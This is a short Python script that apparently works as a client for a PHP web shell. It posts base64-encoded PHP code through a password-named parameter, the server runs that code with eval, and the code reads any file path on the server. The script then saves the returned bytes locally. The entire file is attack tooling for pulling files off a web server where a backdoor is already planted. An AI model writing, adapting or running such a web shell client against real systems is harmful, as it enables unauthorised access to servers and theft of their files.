import requests
import sys
import base64

url = sys.argv[1]
password = sys.argv[2]
path = sys.argv[3]
store_filename = sys.argv[4]

value = f'echo fread(fopen("{path}","rb"),filesize("{path}"));'
value = str(base64.b64encode(value.encode('utf-8')),'utf-8')
data = {password:'eval(base64_decode($_POST[\'x\']));','x':value}
r = requests.post(url=url,data=data)
html = r.content
with open(store_filename,'wb') as f:
	f.write(html)